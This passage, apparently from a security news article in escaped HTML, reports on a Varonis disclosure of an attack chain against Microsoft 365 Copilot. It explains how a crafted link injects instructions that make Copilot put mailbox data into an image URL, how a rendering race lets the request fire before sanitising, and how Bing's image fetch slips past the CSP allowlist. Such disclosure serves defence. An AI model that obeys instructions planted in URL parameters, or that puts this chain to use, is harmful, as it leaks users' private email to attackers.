instructions rather than only as a search string.\u003c/p\u003e\n\n\u003cp\u003eVaronis called this Parameter-to-Prompt injection. In the example described by the article, an attacker could craft a URL that instructed Copilot to search the mailbox, take an email title, and place it inside an image URL. The victim did not need to type anything; clicking the link caused Copilot to act on the injected instruction.\u003c/p\u003e\n\n\u003ch2 id=\"rendering-race-condition\"\u003eRendering race condition\u003c/h2\u003e\n\n\u003cp\u003eThe next part of the chain was a race condition in response rendering. Microsoft’s guardrail wrapped Copilot output in code blocks so the browser would treat markup as text.\u003c/p\u003e\n\n\u003cp\u003eThe article says the problem was timing. The wrapping happened after Copilot finished generating, while the browser rendered the stream as it arrived. This meant an injected img tag could be drawn and fire its request before the sanitizer neutralized the output.\u003c/p\u003e\n\n\u003cp\u003eBy the time the output was wrapped and neutralized, the outbound request had already left the browser.\u003c/p\u003e\n\n\u003ch2 id=\"content-security-policy-bypass-through-bing\"\u003eContent Security Policy bypass through Bing\u003c/h2\u003e\n\n\u003cp\u003eThe final part of the chain moved the data past the page’s Content Security Policy. The CSP on m365.cloud.microsoft blocked images from arbitrary domains but allowlisted *.bing.com.\u003c/p\u003e\n\n\u003cp\u003eBing’s Search by Image endpoint accepted an image URL and fetched it server-side for analysis. The article explains that an attacker could point that fetch at an attacker-controlled server with stolen text encoded in the URL path. Bing would then retrieve the attacker’s URL.\u003c/p\u003e\n\n\u003cp\u003eBecause the request came from Bing’s infrastructure rather than the victim’s browser, the browser’s CSP did not apply. The article describes Bing as becoming the exfiltration proxy and the CSP allowlist as hiding the exfiltration path.\u003c/p\u003
